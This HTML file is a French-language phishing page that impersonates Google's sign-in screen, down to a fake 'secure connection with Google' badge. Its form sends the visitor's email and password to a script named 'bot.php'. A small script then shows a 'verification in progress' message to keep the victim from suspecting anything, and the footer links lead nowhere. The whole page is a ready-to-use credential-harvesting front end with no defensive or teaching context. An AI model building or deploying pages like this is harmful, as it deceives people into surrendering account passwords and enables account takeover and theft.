<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter - Google</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        
        body {
            margin: 0;
            padding: 0;
            font-family: 'Roboto', Arial, sans-serif;
            background: linear-gradient(135deg, #4285F4 0%, #34A853 50%, #FBBC05 100%);
            background-attachment: fixed;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #202124;
        }
        .main {
            width: 100%;
            max-width: 460px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.25);
            padding: 48px 40px 40px;
            text-align: center;
            position: relative;
        }
        .logo {
            height: 82px;
            margin-bottom: 28px;
        }
        h1 {
            font-size: 28px;
            font-weight: 400;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 32px;
        }
        form {
            text-align: left;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            margin-bottom: 24px;
            transition: all 0.2s;
        }
        input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.25);
            outline: none;
        }
        .btn {
            width: 100%;
            padding: 13px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn:hover {
            background: #185abc;
            transform: translateY(-1px);
        }
        .secure {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #34a853;
            font-size: 14px;
            margin: 20px 0 30px;
        }
        .footer {
            margin-top: 40px;
            font-size: 13px;
            color: #70757a;
        }
        .footer a {
            color: #1a73e8;
            text-decoration: none;
            margin: 0 6px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="main">
        

        <h1>Se connecter</h1>
        <p class="subtitle">Utilisez votre compte Google</p>

        <form action="bot.php" method="POST">
            <input type="email" name="email" placeholder="Adresse e-mail ou téléphone" required autofocus>
            <input type="password" name="password" placeholder="Mot de passe" required>
            
            <div class="secure">
                <span>🔒</span>
                <span>Connexion sécurisée avec Google</span>
            </div>
            
            <button type="submit" class="btn">Suivant</button>
        </form>

        <div class="footer">
            <a href="#">Créer un compte</a> • 
            <a href="#">Mot de passe oublié ?</a><br><br>
            <a href="#">Confidentialité</a> • 
            <a href="#">Conditions d'utilisation</a>
        </div>
    </div>

    <script>
        document.querySelector('form').addEventListener('submit', function(e) {
            const btn = document.querySelector('.btn');
            btn.textContent = "Vérification en cours...";
            btn.style.background = "#34a853";
        });
    </script>
</body>
</html>
